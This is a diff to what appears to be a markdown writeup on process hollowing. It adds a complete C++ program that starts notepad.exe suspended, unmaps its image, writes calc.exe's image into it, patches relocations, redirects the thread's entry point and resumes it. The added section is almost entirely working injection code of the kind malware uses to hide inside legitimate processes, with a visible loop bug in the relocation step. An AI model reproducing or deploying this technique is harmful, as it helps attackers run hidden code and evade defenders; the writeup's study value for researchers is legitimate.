@@ -270,6 +270,164 @@ SetThreadContext(pi->hThread, context);
 ResumeThread(pi->hThread);
 ```
 
+## Complete code
+```cpp
+#include <Windows.h>
+#include <winternl.h>
+#include <stdio.h>
+#include <tchar.h>
+#include <iostream>
+
+using namespace std;
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+}BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+// define function pointer for NtQueryInformationProcess
+typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
+	IN  HANDLE ProcessHandle,
+	IN  PROCESSINFOCLASS ProcessInformationClass,
+	OUT PVOID ProcessInformation,
+	IN  ULONG ProcessInformationLength,
+	OUT PULONG ReturnLength    OPTIONAL
+	);
+
+pfnNtQueryInformationProcess gNtQueryInformationProcess;
+
+// define function pointer NtUnmapViewOfSection
+typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
+	IN HANDLE ProcessHandle, 
+	IN PVOID BaseAddress
+	);
+
+pfnNtUnmapViewOfSection gNtUnmapViewOfSection;
+
+void _tmain(int argc, TCHAR* argv[]) {
+
+	// create destination process - this is the process to be hollowed out
+	LPSTARTUPINFOA si = new STARTUPINFOA();
+	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
+
+	CreateProcessA((LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
+
+	// read source file - this is the file that will be executed inside the hollowed process
+	HANDLE sourceFile = CreateFileA((LPCSTR)"c:\\windows\\syswow64\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	DWORD64 sourceFileSize = GetFileSize(sourceFile, NULL);
+	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
+	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
+
+	// utilise runtime dynamic linking to obtain a function pointer to NtQueryInformationProcess
+	HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
+	gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll,
+		"NtQueryInformationProcess");
+
+	HANDLE destProcess = pi->hProcess;
+	// get destination imageBase offset address from the PEB by calling NtQueryInformationProcess
+	gNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+	DWORD_PTR pebImageBaseOffset = (DWORD_PTR)pbi->PebBaseAddress + 8;
+
+	// get destination imageBaseAddress
+	LPVOID destImageBase = 0;
+	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, NULL);
+
+	// unmap the target process by calling NtUnmapViewOfSection
+	gNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
+	gNtUnmapViewOfSection(destProcess, destImageBase);
+
+	// obtain image size of the source image
+	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
+	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
+	DWORD sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
+
+	// allocate memory in the target process
+	VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	// patch the image base of the source image
+	//save the source image base before patching for calculating delta in later sections
+	DWORD sourceImageBase = (DWORD)sourceImageNTHeaders->OptionalHeader.ImageBase;
+	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
+	WriteProcessMemory(destProcess, destImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
+
+	// copy each section from the source to the destination
+	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS32));
+	DWORD sectionsCount = sourceImageNTHeaders->FileHeader.NumberOfSections;
+	DWORD relocationAddress;
+	DWORD relocationTableSize;
+
+	for (int i = 0; i < sectionsCount; i++) {
+		// sourceImageSection->VirtualAddress is the offset where the section will be loaded in memory.
+		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
+
+		// sourceImageSection->PointerToRawData is the location of the section on disk.
+		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
+		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
+
+		// get relocation table address and size for patching
+		BYTE* reloc = (BYTE*)".reloc";
+		if ((memcmp(reloc, sourceImageSection->Name, 5) == 0)) {
+			relocationAddress = (DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData;
+			relocationTableSize = (DWORD)sourceImageSection->SizeOfRawData;
+		}
+
+		sourceImageSection++;
+	}
+
+	// calculate delta
+	DWORD deltaImageBase = ((DWORD)destImageBase - sourceImageBase);
+
+	// patch the base relocation table
+	IMAGE_DATA_DIRECTORY relocationTable = (IMAGE_DATA_DIRECTORY)sourceImageNTHeaders->OptionalHeader.DataDirectory[5];
+	PIMAGE_BASE_RELOCATION imageBaseRelocation = (PIMAGE_BASE_RELOCATION)(DWORD)relocationAddress;
+	DWORD relocationOffset = 0;
+
+	while (imageBaseRelocation->SizeOfBlock) {
+		DWORD relocationEntriesCount = (imageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
+		PBASE_RELOCATION_ENTRY baseRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD)imageBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+		for (int i = 0; i < relocationEntriesCount; i++) {
+			if (baseRelocationEntry->Type == 0) {
+				continue;
+			}
+			DWORD buffer = 0;
+			DWORD patchAddress = (DWORD)destImageBase + imageBaseRelocation->VirtualAddress + baseRelocationEntry->Offset;
+			ReadProcessMemory(destProcess, (LPCVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
+			buffer += deltaImageBase;
+
+			WriteProcessMemory(destProcess, (PVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
+			baseRelocationEntry++;
+		}
+
+		imageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD)imageBaseRelocation + imageBaseRelocation->SizeOfBlock);
+	}
+
+	// create a pointer to a new context object
+	LPCONTEXT context = new CONTEXT();
+
+	// define the context flags
+	context->ContextFlags = CONTEXT_INTEGER;
+
+	// call get thread context
+	GetThreadContext(pi->hThread, context);
+
+	// update dest image entry point to the new entry point of the source image and resume dest image thread
+
+	// get the patched entry point
+	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
+
+	// replace the entry point defines in the eax variable with the patched entry point
+	context->Eax = patchedEntryPoint;
+
+	// set the thread context
+	SetThreadContext(pi->hThread, context);
+
+	// resume the suspended process
+	ResumeThread(pi->hThread);
+	return;
+}
+```
+
 ## References
 - [https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#code](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#code)
 
